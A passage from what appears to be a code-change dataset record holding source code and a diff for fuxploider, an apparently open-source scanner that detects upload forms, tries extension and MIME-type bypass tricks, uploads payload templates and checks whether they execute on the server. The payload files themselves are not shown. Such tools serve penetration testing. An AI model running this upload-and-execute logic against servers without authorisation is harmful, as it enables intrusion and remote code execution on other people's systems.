= postData\n\t\tself.formUrl = formUrl\n\t\turl = urlparse(self.formUrl)\n\t\tself.schema = url.scheme\n\t\tself.host = url.netloc\n\t\tself.uploadUrl = urljoin(formUrl, formAction)\n\t\tself.session = session\n\t\tself.trueRegex = trueRegex\n\t\tself.notRegex = notRegex\n\t\tself.inputName = inputName\n\t\tself.uploadsFolder = uploadsFolder\n\t\tself.size = size\n\t\tself.validExtensions = []\n\t\tself.httpRequests = 0\n\t\tself.codeExecUrlPattern = None #pattern for code exec detection using true regex findings\n\t\tself.logLock = Lock()\n\t\tself.stopThreads = False\n\t\tself.shouldLog = True\n\n\t#searches for a valid html form containing an input file, sets object parameters correctly\n\tdef setup(self,initUrl) :\n\t\tself.formUrl = initUrl\n\t\turl = urlparse(self.formUrl)\n\t\tself.schema = url.scheme\n\t\tself.host = url.netloc\n\n\t\tself.httpRequests = 0\n\t\ttry :\n\t\t\tinitGet = self.session.get(self.formUrl,headers={\"Accept-Encoding\":None})\n\t\t\tself.httpRequests += 1\n\t\t\tif self.logger.verbosity > 1 :\n\t\t\t\tprintSimpleResponseObject(initGet)\n\t\t\tif self.logger.verbosity > 2 :\n\t\t\t\tprint(\"\\033[36m\"+initGet.text+\"\\033[m\")\n\t\t\tif initGet.status_code < 200 or initGet.status_code > 300 :\n\t\t\t\tself.logger.critical(\"Server responded with following status : %s - %s\",initGet.status_code,initGet.reason)\n\t\t\t\texit()\n\t\texcept Exception as e :\n\t\t\t\tself.logger.critical(\"%s : Host unreachable (%s)\",getHost(initUrl),e)\n\t\t\t\texit()\n\t\t#r\u00e9cup\u00e9rer le formulaire,le d\u00e9tecter\n\t\tdetectedForms = detectForms(initGet.text)\n\t\tif len(detectedForms) == 0 :\n\t\t\tself.logger.critical(\"No HTML form found here\")\n\t\t\texit()\n\t\tif len(detectedForms) > 1 :\n\t\t\tself.logger.critical(\"%s forms found containing file upload inputs, no way to choose which one to test.\",len(detectedForms))\n\t\t\texit()\n\t\tif len(detectedForms[0][1]) > 1 :\n\t\t\tself.logger.critical(\"%s file inputs found inside the same form, no way to choose which one to test.\",len(detectedForms[0]))\n\t\t\texit()\n\n\t\tself.inputName = detectedForms[0][1][0][\"name\"]\n\t\tself.logger.debug(\"Found the following file upload input : %s\",self.inputName)\n\t\tformDestination = detectedForms[0][0]\n\n\t\ttry :\n\t\t\tself.action = formDestination[\"action\"]\n\t\texcept :\n\t\t\tself.action = \"\"\n\t\tself.uploadUrl = urljoin(self.formUrl,self.action)\n\n\t\tself.logger.debug(\"Using following URL for file upload : %s\",self.uploadUrl)\n\n\t\tif not self.uploadsFolder and not self.trueRegex :\n\t\t\tself.logger.warning(\"No uploads folder nor true regex defined, code execution detection will not be possible.\")\n\t\telif not self.uploadsFolder and self.trueRegex :\n\t\t\tprint(\"No uploads path provided, code detection can still be done using true regex capturing group.\")\n\t\t\tcont = input(\"Do you want to use the True Regex for code execution detection ? [Y/n] \")\n\t\t\tif cont.lower().startswith(\"y\") or cont == \"\" :\n\t\t\t\tpreffixPattern = input(\"Preffix capturing group of the true regex with : \")\n\t\t\t\tsuffixPattern = input(\"Suffix capturing group of the true regex with : \")\n\t\t\t\tself.codeExecUrlPattern = preffixPattern+\"$captGroup$\"+suffixPattern\n\t\t\telse :\n\t\t\t\tself.logger.warning(\"Code execution detection will not be possible as there is no path nor regex pattern configured.\")\n\t\telse :\n\t\t\tpass#uploads folder provided\n\n\t#tries to upload a file through the file upload form\n\tdef uploadFile(self,suffix,mime,payload) :\n\t\twith tempfile.NamedTemporaryFile(suffix=suffix) as fd :\n\t\t\tfd.write(payload)\n\t\t\tfd.flush()\n\t\t\tfd.seek(0)\n\t\t\tfilename = os.path.basename(fd.name)\n\t\t\tif self.shouldLog :\n\t\t\t\tself.logger.debug(\"Sending file %s with mime type : %s\",filename,mime)\n\t\t\tfu = self.session.post(self.uploadUrl,files={self.inputName:(filename,fd,mime)},data=self.postData)\n\t\t\tself.httpRequests += 1\n\t\t\tif self.shouldLog :\n\t\t\t\tif self.logger.verbosity > 1 :\n\t\t\t\t\tprintSimpleResponseObject(fu)\n\t\t\t\tif self.logger.verbosity > 2 :\n\t\t\t\t\tprint(\"\\033[36m\"+fu.text+\"\\033[m\")\n\t\t\t\n\t\treturn (fu,filename)\n\n\t#detects if a given html code represents an upload success or not\n\tdef isASuccessfulUpload(self,html) :\n\t\tresult = False\n\t\tvalidExt = False\n\t\tif self.notRegex :\n\t\t\tfileUploaded = re.search(self.notRegex,html)\n\t\t\tif fileUploaded == None :\n\t\t\t\tresult = True\n\t\t\t\tif self.trueRegex :\n\t\t\t\t\tmoreInfo = re.search(self.trueRegex,html)\n\t\t\t\t\tif moreInfo :\n\t\t\t\t\t\tresult = str(moreInfo.groups())\n\t\tif self.trueRegex and not result :\n\t\t\tfileUploaded = re.search(self.trueRegex,html)\n\t\t\tif fileUploaded :\n\t\t\t\ttry :\n\t\t\t\t\tresult = str(fileUploaded.group(1))\n\t\t\t\texcept :\n\t\t\t\t\tresult = str(fileUploaded.group(0))\n\t\treturn result\n\n\t#callback function for matching html text against regex in order to detect successful uploads\n\tdef detectValidExtension(self, future) :\n\t\tif not self.stopThreads :\n\t\t\thtml = future.result()[0].text\n\t\t\text = future.ext[0]\n\n\t\t\tr = self.isASuccessfulUpload(html)\n\t\t\tif r :\n\t\t\t\tself.validExtensions.append(ext)\n\t\t\t\tif self.shouldLog :\n\t\t\t\t\tself.logger.info(\"\\033[1m\\033[42mExtension %s seems valid for this form.\\033[m\", ext)\n\t\t\t\t\tif r != True :\n\t\t\t\t\t\tself.logger.info(\"\\033[1;32mTrue regex matched the following information : %s\\033[m\",r)\n\n\t\t\treturn r\n\t\telse :\n\t\t\treturn None\n\n\t#detects valid extensions for this upload form (sending legit files with legit mime types)\n\tdef detectValidExtensions(self,extensions,maxN,extList=None) :\n\t\tself.logger.info(\"### Starting detection of valid extensions ...\")\n\t\tn = 0\n\t\tif extList :\n\t\t\ttmpExtList = []\n\t\t\tfor e in extList :\n\t\t\t\ttmpExtList.append((e,getMime(extensions,e)))\n\t\telse :\n\t\t\ttmpExtList = extensions\n\t\tvalidExtensions = []\n\n\t\textensionsToTest = tmpExtList[0:maxN]\n\t\twith concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor :\n\t\t\tfutures = []\n\t\t\ttry :\n\t\t\t\tfor ext in extensionsToTest:\n\t\t\t\t\tf = executor.submit(self.uploadFile,\".\"+ext[0],ext[1],os.urandom(self.size))\n\t\t\t\t\tf.ext = ext\n\t\t\t\t\tf.add_done_callback(self.detectValidExtension)\n\t\t\t\t\tfutures.append(f)\n\t\t\t\tfor future in concurrent.futures.as_completed(futures) :\n\t\t\t\t\ta = future.result()\n\t\t\t\t\tn += 1\n\t\t\texcept KeyboardInterrupt :\n\t\t\t\tself.shouldLog = False\n\t\t\t\texecutor.shutdown(wait=False)\n\t\t\t\tself.stopThreads = True\n\t\t\t\texecutor._threads.clear()\n\t\t\t\tconcurrent.futures.thread._threads_queues.clear()\n\t\treturn n\n\n\t#detects if code execution is gained, given an url to request and a regex supposed to match the executed code output\n\tdef detectCodeExec(self,url,regex) :\n\t\tif self.shouldLog :\n\t\t\tif self.logger.verbosity > 0 :\n\t\t\t\tself.logger.debug(\"Requesting %s ...\",url)\n\t\t\n\t\tr = self.session.get(url)\n\t\tif self.shouldLog :\n\t\t\tif r.status_code >= 400 :\n\t\t\t\tself.logger.warning(\"Code exec detection returned an http code of %s.\",r.status_code)\n\t\t\tself.httpRequests += 1\n\t\t\tif self.logger.verbosity > 1 :\n\t\t\t\tprintSimpleResponseObject(r)\n\t\t\tif self.logger.verbosity > 2 :\n\t\t\t\tprint(\"\\033[36m\"+r.text+\"\\033[m\")\n\n\t\tres = re.search(regex,r.text)\n\t\tif res :\n\t\t\treturn True\n\t\telse :\n\t\t\treturn False\n\n\t#core function : generates a temporary file using a suffixed name, a mime type and content, uploads the temp file on the server and eventually try to detect\n\t#\tif code execution is gained through the uploaded file\n\tdef submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :\n\t\tfu = self.uploadFile(suffix,mime,payload)\n\t\tuploadRes = self.isASuccessfulUpload(fu[0].text)\n\t\tresult = {\"uploaded\":False,\"codeExec\":False}\n\t\tif uploadRes :\n\t\t\tresult[\"uploaded\"] = True\n\t\t\tif self.shouldLog :\n\t\t\t\tself.logger.info(\"\\033[1;32mUpload of '%s' with mime type %s successful\\033[m\",fu[1], mime)\n\t\t\t\n\t\t\tif uploadRes != True :\n\t\t\t\tif self.shouldLog :\n\t\t\t\t\tself.logger.info(\"\\033[1;32m\\tTrue regex matched the following information : %s\\033[m\",uploadRes)\n\n\t\t\tif codeExecRegex and valid_regex(codeExecRegex) and (self.uploadsFolder or self.trueRegex) :\n\t\t\t\turl = None\n\t\t\t\tsecondUrl = None\n\t\t\t\tif self.uploadsFolder :\n\t\t\t\t\turl = self.schema+\"://\"+self.host+\"/\"+self.uploadsFolder+\"/\"+fu[1]\n\t\t\t\t\tfilename = fu[1]\n\t\t\t\t\tsecondUrl = None\n\t\t\t\t\tfor b in getPoisoningBytes() :\n\t\t\t\t\t\tif b in filename :\n\t\t\t\t\t\t\tsecondUrl = b.join(url.split(b)[:-1])\n\t\t\t\telif self.codeExecUrlPattern :\n\t\t\t\t\t#code exec detection through true regex\n\t\t\t\t\turl = self.codeExecUrlPattern.replace(\"$captGroup$\",uploadRes)\n\t\t\t\telse :\n\t\t\t\t\tpass\n\t\t\t\t\t#self.logger.warning(\"Impossible to determine where to find the uploaded payload.\")\n\t\t\t\tif url :\n\t\t\t\t\texecutedCode = self.detectCodeExec(url,codeExecRegex)\n\t\t\t\t\tif executedCode :\n\t\t\t\t\t\tresult[\"codeExec\"] = True\n\t\t\t\tif secondUrl :\n\t\t\t\t\texecutedCode = self.detectCodeExec(secondUrl,codeExecRegex)\n\t\t\t\t\tif executedCode :\n\t\t\t\t\t\tresult[\"codeExec\"] = True\n\t\treturn result\n\n\t#detects html forms and returns a list of beautifulSoup objects (detected forms)\n\tdef detectForms(html) :\n\t\tsoup = BeautifulSoup(html,'html.parser')\n\t\tdetectedForms = soup.find_all(\"form\")\n\t\treturnForms = []\n\t\tif len(detectedForms) > 0 :\n\t\t\tfor f in detectedForms :\n\t\t\t\tfileInputs = f.findChildren(\"input\",{\"type\":\"file\"})\n\t\t\t\tif len(fileInputs) > 0 :\n\t\t\t\t\treturnForms.append((f,fileInputs))\n\n\t\treturn returnForms"}, "/fuxploider.py": {"changes": [{"diff": "\n \ttemplatefd = open(templatesFolder+\"/\"+template[\"filename\"],\"rb\")\n \ttemplatesData[template[\"templateName\"]] = templatefd.read()\n \ttemplatefd.close()\n-\tnastyExt = template[\"nastyExt\"]\n-\tnastyMime = getMime(extensions,nastyExt)\n-\tnastyExtVariants = template[\"extVariants\"]\n-\tfor t in techniques :\n-\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n-\t\t\tfor legitExt in up.validExtensions :\n-\t\t\t\tlegitMime = getMime(extensions,legitExt)\n-\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n-\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n-\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})\n+\tnastyExt = template.get(\"nastyExt\")\n+\tnastyMime = None if nastyExt == None else getMime(extensions,nastyExt)\n+\tnastyExtVariants = template.get(\"extVariants\")\n+\tcodeExecURL = template.get(\"codeExecURL\")\n+\tdynamicPayload = template.get(\"dynamicPayload\")\n+\tfor legitExt in up.validExtensions:\n+\t\tlegitMime = getMime(extensions, legitExt)\n+\t\tif nastyExt == None:\n+\t\t\tattempts.append({\"suffix\": \".\"+legitExt, \"mime\": legitMime, \"templateName\": template[\"templateName\"],\n+\t\t\t\t\t\t\t \"codeExecURL\": codeExecURL, \"dynamicPayload\": dynamicPayload})\n+\t\telse:\n+\t\t\tfor t in techniques :\n+\t\t\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n+\t\t\t\t\tlegitMime = getMime(extensions,legitExt)\n+\t\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n+\t\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n+\t\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"],\n+\t\t\t\t\t\t\t\t\t \"codeExecURL\":codeExecURL,\"dynamicPayload\":dynamicPayload})\n \n \n stopThreads = False\n", "add": 18, "remove": 10, "filename": "/fuxploider.py", "badparts": ["\tnastyExt = template[\"nastyExt\"]", "\tnastyMime = getMime(extensions,nastyExt)", "\tnastyExtVariants = template[\"extVariants\"]", "\tfor t in techniques :", "\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :", "\t\t\tfor legitExt in up.validExtensions :", "\t\t\t\tlegitMime = getMime(extensions,legitExt)", "\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime", "\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)", "\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})"], "goodparts": ["\tnastyExt = template.get(\"nastyExt\")", "\tnastyMime = None if nastyExt == None else getMime(extensions,nastyExt)", "\tnastyExtVariants = template.get(\"extVariants\")", "\tcodeExecURL = template.get(\"codeExecURL\")", "\tdynamicPayload = template.get(\"dynamicPayload\")", "\tfor legitExt in up.validExtensions:", "\t\tlegitMime = getMime(extensions, legitExt)", "\t\tif nastyExt == None:", "\t\t\tattempts.append({\"suffix\": \".\"+legitExt, \"mime\": legitMime, \"templateName\": template[\"templateName\"],", "\t\t\t\t\t\t\t \"codeExecURL\": codeExecURL, \"dynamicPayload\": dynamicPayload})", "\t\telse:", "\t\t\tfor t in techniques :", "\t\t\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :", "\t\t\t\t\tlegitMime = getMime(extensions,legitExt)", "\t\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime", "\t\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)", "\t\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"],", "\t\t\t\t\t\t\t\t\t \"codeExecURL\":codeExecURL,\"dynamicPayload\":dynamicPayload})"]}, {"diff": " \t\t\tmime = a[\"mime\"]\n \t\t\tpayload = templatesData[a[\"templateName\"]]\n \t\t\tcodeExecRegex = [t[\"codeExecRegex\"] for t in templates if t[\"templateName\"] == a[\"templateName\"]][0]\n+\t\t\tcodeExecURL = a[\"codeExecURL\"]\n+\t\t\tdynamicPayload = a[\"dynamicPayload\"]\n \n-\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)\n+\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex,codeExecURL,dynamicPayload)\n \t\t\tf.a = a\n \t\t\tfutures.append(f)\n", "add": 3, "remove": 1, "filename": "/fuxploider.py", "badparts": ["\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)"], "goodparts": ["\t\t\tcodeExecURL = a[\"codeExecURL\"]", "\t\t\tdynamicPayload = a[\"dynamicPayload\"]", "\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex,codeExecURL,dynamicPayload)"]}], "source": "\n\nimport re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures,random from utils import * from UploadForm import UploadForm from threading import Lock version=\"0.5.0\" logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]') logger=logging.getLogger(\"fuxploider\") coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s -%(message)s',level=logging.INFO) logging.getLogger(\"requests\").setLevel(logging.ERROR) templatesFolder=\"payloads\" with open(\"templates.json\",\"r\") as fd: \ttemplates=json.loads(fd.read()) templatesNames=[x[\"templateName\"] for x in templates] templatesSection=\"[TEMPLATES]\\nTemplates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload.\" templatesSection +=\"\\n\\tDefault templates are the following(name -description): \" for t in templates: \ttemplatesSection+=\"\\n\\t * '\"+t[\"templateName\"]+\"' -\"+t[\"description\"] parser=argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter) parser.add_argument(\"-d\", \"--data\", metavar=\"postData\",dest=\"data\", help=\"Additionnal data to be transmitted via POST method. Example: -d \\\"key1=value1&key2=value2\\\"\", type=valid_postData) parser.add_argument(\"--proxy\", metavar=\"proxyUrl\", dest=\"proxy\", help=\"Proxy information. Example: --proxy \\\"user:password@proxy.host:8080\\\"\", type=valid_proxyString) parser.add_argument(\"--proxy-creds\",metavar=\"credentials\",nargs='?',const=True,dest=\"proxyCreds\",help=\"Prompt for proxy credentials at runtime. Format: 'user:pass'\",type=valid_proxyCreds) parser.add_argument(\"-f\",\"--filesize\",metavar=\"integer\",nargs=1,default=[\"10\"],dest=\"size\",help=\"File size to use for files to be created and uploaded(in kB).\") parser.add_argument(\"--cookies\",metavar=\"omnomnom\",nargs=1,dest=\"cookies\",help=\"Cookies to use with HTTP requests. Example: PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG\",type=valid_postData) parser.add_argument(\"--uploads-path\",default=[None],metavar=\"path\",nargs=1,dest=\"uploadsPath\",help=\"Path on the remote server where uploads are put. Example: '/tmp/uploads/'\") parser.add_argument(\"-t\",\"--template\",metavar=\"templateName\",nargs=1,dest=\"template\",help=\"Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.\") parser.add_argument(\"-r\",\"--regex-override\",metavar=\"regex\",nargs=1,dest=\"regexOverride\",help=\"Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.\",type=valid_regex) requiredNamedArgs=parser.add_argument_group('Required named arguments') requiredNamedArgs.add_argument(\"-u\",\"--url\", metavar=\"target\", dest=\"url\",required=True, help=\"Web page URL containing the file upload form to be tested. Example: http://test.com/index.html?action=upload\", type=valid_url) requiredNamedArgs.add_argument(\"--not-regex\", metavar=\"regex\", help=\"Regex matching an upload failure\", type=valid_regex,dest=\"notRegex\") requiredNamedArgs.add_argument(\"--true-regex\",metavar=\"regex\", help=\"Regex matching an upload success\", type=valid_regex, dest=\"trueRegex\") exclusiveArgs=parser.add_mutually_exclusive_group() exclusiveArgs.add_argument(\"-l\",\"--legit-extensions\",metavar=\"listOfExtensions\",dest=\"legitExtensions\",nargs=1,help=\"Legit extensions expected, for a normal use of the form, comma separated. Example: 'jpg,png,bmp'\") exclusiveArgs.add_argument(\"-n\",metavar=\"n\",nargs=1,default=[\"100\"],dest=\"n\",help=\"Number of common extensions to use. Example: -n 100\", type=valid_nArg) exclusiveVerbosityArgs=parser.add_mutually_exclusive_group() exclusiveVerbosityArgs.add_argument(\"-v\",action=\"store_true\",required=False,dest=\"verbose\",help=\"Verbose mode\") exclusiveVerbosityArgs.add_argument(\"-vv\",action=\"store_true\",required=False,dest=\"veryVerbose\",help=\"Very verbose mode\") exclusiveVerbosityArgs.add_argument(\"-vvv\",action=\"store_true\",required=False,dest=\"veryVeryVerbose\",help=\"Much verbose, very log, wow.\") parser.add_argument(\"-s\",\"--skip-recon\",action=\"store_true\",required=False,dest=\"skipRecon\",help=\"Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.\") parser.add_argument(\"-y\",action=\"store_true\",required=False,dest=\"detectAllEntryPoints\",help=\"Force detection of every entry points. Will not stop at first code exec found.\") parser.add_argument(\"-T\",\"--threads\",metavar=\"Threads\",nargs=1,dest=\"nbThreads\",help=\"Number of parallel tasks(threads).\",type=int,default=[4]) exclusiveUserAgentsArgs=parser.add_mutually_exclusive_group() exclusiveUserAgentsArgs.add_argument(\"-U\",\"--user-agent\",metavar=\"useragent\",nargs=1,dest=\"userAgent\",help=\"User-agent to use while requesting the target.\",type=str,default=[requests.utils.default_user_agent()]) exclusiveUserAgentsArgs.add_argument(\"--random-user-agent\",action=\"store_true\",required=False,dest=\"randomUserAgent\",help=\"Use a random user-agent while requesting the target.\") manualFormArgs=parser.add_argument_group('Manual Form Detection arguments') manualFormArgs.add_argument(\"-m\",\"--manual-form-detection\",action=\"store_true\",dest=\"manualFormDetection\",help=\"Disable automatic form detection. Useful when automatic detection fails due to:(1) Form loaded using Javascript(2) Multiple file upload forms in URL.\") manualFormArgs.add_argument(\"--input-name\",metavar=\"image\",dest=\"inputName\",help=\"Name of input for file. Example: <input type=\\\"file\\\" name=\\\"image\\\">\") manualFormArgs.add_argument(\"--form-action\",default=\"\",metavar=\"upload.php\",dest=\"formAction\",help=\"Path of form action. Example: <form method=\\\"POST\\\" action=\\\"upload.php\\\">\") args=parser.parse_args() args.uploadsPath=args.uploadsPath[0] args.nbThreads=args.nbThreads[0] args.userAgent=args.userAgent[0] if args.randomUserAgent: \twith open(\"user-agents.txt\",\"r\") as fd: \t\tnb=0 \t\tfor l in fd: \t\t\tnb +=1 \t\tfd.seek(0) \t\tnb=random.randint(0,nb) \t\tfor i in range(0,nb): \t\t\targs.userAgent=fd.readline()[:-1] if args.template: \targs.template=args.template[0] \tif args.template not in templatesNames: \t\tlogging.warning(\"Unknown template: %s\",args.template) \t\tcont=input(\"Use default templates instead ?[Y/n]\") \t\tif not cont.lower().startswith(\"y\"): \t\t\texit() \telse: \t\ttemplates=[[x for x in templates if x[\"templateName\"]==args.template][0]] if args.regexOverride: \tfor t in templates: \t\tt[\"codeExecRegex\"]=args.regexOverride[0] args.verbosity=0 if args.verbose: \targs.verbosity=1 if args.veryVerbose: \targs.verbosity=2 if args.veryVeryVerbose: \targs.verbosity=3 logger.verbosity=args.verbosity if args.verbosity > 0: \tcoloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s -%(message)s',level=logging.DEBUG) if args.proxyCreds and args.proxy==None: \tparser.error(\"--proxy-creds must be used with --proxy.\") if args.skipRecon and args.legitExtensions==None: \tparser.error(\"-s switch needs -l switch. Cannot skip recon phase without any known entry point.\") args.n=int(args.n[0]) args.size=int(args.size[0]) args.size=1024*args.size if not args.notRegex and not args.trueRegex: \tparser.error(\"At least one detection method must be provided, either with --not-regex or with --true-regex.\") if args.legitExtensions: \targs.legitExtensions=args.legitExtensions[0].split(\",\") if args.cookies: \targs.cookies=postDataFromStringToJSON(args.cookies[0]) if args.manualFormDetection and args.inputName is None: \tparser.error(\"--manual-form-detection requires --input-name\") print(\"\"\"\\033[1;32m ___ _ _ _ | _|_ _ _ _ ___| |___|_|_| |___ ___ | _| | |_'_|. | |. | |. | -_| _| |_| |___|_,_| _|_|___|_|___|___|_| |_| \\033[1m\\033[42m{version \"\"\"+version+\"\"\"}\\033[m \\033[m[!] legal disclaimer: Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program \t\"\"\") if args.proxyCreds==True: \targs.proxyCreds={} \targs.proxyCreds[\"username\"]=input(\"Proxy username: \") \targs.proxyCreds[\"password\"]=getpass.getpass(\"Proxy password: \") now=datetime.datetime.now() print(\"[*] starting at \"+str(now.hour)+\":\"+str(now.minute)+\":\"+str(now.second)) mimeFile=\"mimeTypes.basic\" extensions=loadExtensions(\"file\",mimeFile) tmpLegitExt=[] if args.legitExtensions: \targs.legitExtensions=[x.lower() for x in args.legitExtensions] \tfoundExt=[a[0] for a in extensions] \tfor b in args.legitExtensions: \t\tif b in foundExt: \t\t\ttmpLegitExt.append(b) \t\telse: \t\t\tlogging.warning(\"Extension %s can't be found as a valid/known extension with associated mime type.\",b) args.legitExtensions=tmpLegitExt postData=postDataFromStringToJSON(args.data) s=requests.Session() if args.cookies: \tfor key in args.cookies.keys(): \t\ts.cookies[key]=args.cookies[key] s.headers={'User-Agent':args.userAgent} s.trust_env=False if args.proxy: \tif args.proxy[\"username\"] and args.proxy[\"password\"] and args.proxyCreds: \t\tlogging.warning(\"Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch\") \tif args.proxyCreds: \t\tproxyUser=args.proxyCreds[\"username\"] \t\tproxyPass=args.proxyCreds[\"password\"] \telse: \t\tproxyUser=args.proxy[\"username\"] \t\tproxyPass=args.proxy[\"password\"] \tproxyProtocol=args.proxy[\"protocol\"] \tproxyHostname=args.proxy[\"hostname\"] \tproxyPort=args.proxy[\"port\"] \tproxy=\"\" \tif proxyProtocol !=None: \t\tproxy +=proxyProtocol+\"://\" \telse: \t\tproxy +=\"http://\" \tif proxyUser !=None and proxyPass !=None: \t\tproxy +=proxyUser+\":\"+proxyPass+\"@\" \tproxy +=proxyHostname \tif proxyPort !=None: \t\tproxy +=\":\"+proxyPort \tif proxyProtocol==\"https\": \t\tproxies={\"https\":proxy} \telse: \t\tproxies={\"http\":proxy,\"https\":proxy} \ts.proxies.update(proxies) if args.manualFormDetection: \tif args.formAction==\"\": \t\tlogger.warning(\"Using Manual Form Detection and no action specified with --form-action. Defaulting to empty string -meaning form action will be set to --url parameter.\") \tup=UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath,args.url,args.formAction,args.inputName) else: \tup=UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath) \tup.setup(args.url) up.threads=args.nbThreads uploadURL=up.uploadUrl fileInput={\"name\":up.inputName} a=datetime.datetime.now() if not args.skipRecon: \tif len(args.legitExtensions) > 0: \t\tn=up.detectValidExtensions(extensions,args.n,args.legitExtensions) \telse: \t\tn=up.detectValidExtensions(extensions,args.n) \tlogger.info(\" else: \tlogger.info(\" \tup.validExtensions=args.legitExtensions if up.validExtensions==[]: \tlogger.error(\"No valid extension found.\") \texit() b=datetime.datetime.now() print(\"Extensions detection: \"+str(b-a)) cont=input(\"Start uploading payloads ?[Y/n]: \") up.shouldLog=True if cont.lower().startswith(\"y\") or cont==\"\": \tpass else: \texit(\"Exiting.\") entryPoints=[] up.stopThreads=True with open(\"techniques.json\",\"r\") as rawTechniques: \ttechniques=json.loads(rawTechniques.read()) logger.info(\" c=datetime.datetime.now() nbOfEntryPointsFound=0 attempts=[] templatesData={} for template in templates: \ttemplatefd=open(templatesFolder+\"/\"+template[\"filename\"],\"rb\") \ttemplatesData[template[\"templateName\"]]=templatefd.read() \ttemplatefd.close() \tnastyExt=template[\"nastyExt\"] \tnastyMime=getMime(extensions,nastyExt) \tnastyExtVariants=template[\"extVariants\"] \tfor t in techniques: \t\tfor nastyVariant in[nastyExt]+nastyExtVariants: \t\t\tfor legitExt in up.validExtensions: \t\t\t\tlegitMime=getMime(extensions,legitExt) \t\t\t\tmime=legitMime if t[\"mime\"]==\"legit\" else nastyMime \t\t\t\tsuffix=t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant) \t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]}) stopThreads=False attemptsTested=0 with concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as executor: \tfutures=[] \ttry: \t\tfor a in attempts: \t\t\tsuffix=a[\"suffix\"] \t\t\tmime=a[\"mime\"] \t\t\tpayload=templatesData[a[\"templateName\"]] \t\t\tcodeExecRegex=[t[\"codeExecRegex\"] for t in templates if t[\"templateName\"]==a[\"templateName\"]][0] \t\t\tf=executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex) \t\t\tf.a=a \t\t\tfutures.append(f) \t\tfor future in concurrent.futures.as_completed(futures): \t\t\tres=future.result() \t\t\tattemptsTested +=1 \t\t\tif not stopThreads: \t\t\t\tif res[\"codeExec\"]: \t\t\t\t\tfoundEntryPoint=future.a \t\t\t\t\tlogging.info(\"\\033[1m\\033[42mCode execution obtained('%s','%s','%s')\\033[m\",foundEntryPoint[\"suffix\"],foundEntryPoint[\"mime\"],foundEntryPoint[\"templateName\"]) \t\t\t\t\tnbOfEntryPointsFound +=1 \t\t\t\t\tentryPoints.append(foundEntryPoint) \t\t\t\t\tif not args.detectAllEntryPoints: \t\t\t\t\t\traise KeyboardInterrupt \texcept KeyboardInterrupt: \t\tstopThreads=True \t\texecutor.shutdown(wait=False) \t\texecutor._threads.clear() \t\tconcurrent.futures.thread._threads_queues.clear() \t\tlogger.setLevel(logging.CRITICAL) \t\tlogger.verbosity=-1 d=datetime.datetime.now() print() logging.info(\"%s entry point(s) found using %s HTTP requests.\",nbOfEntryPointsFound,up.httpRequests) print(\"Found the following entry points: \") print(entryPoints) ", "sourceWithComments": "#!/usr/bin/python3\nimport re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures,random\nfrom utils import *\nfrom UploadForm import UploadForm\nfrom threading import Lock\n#signal.signal(signal.SIGINT, quitting)\nversion = \"0.5.0\"\nlogging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')\nlogger = logging.getLogger(\"fuxploider\")\n\ncoloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.INFO)\nlogging.getLogger(\"requests\").setLevel(logging.ERROR)\n\n#################### TEMPLATES DEFINITION HERE ######################\ntemplatesFolder = \"payloads\"\nwith open(\"templates.json\",\"r\") as fd :\n\ttemplates = json.loads(fd.read())\n#######################################################################\ntemplatesNames = [x[\"templateName\"] for x in templates]\ntemplatesSection = \"[TEMPLATES]\\nTemplates are malicious payloads meant to be uploaded on 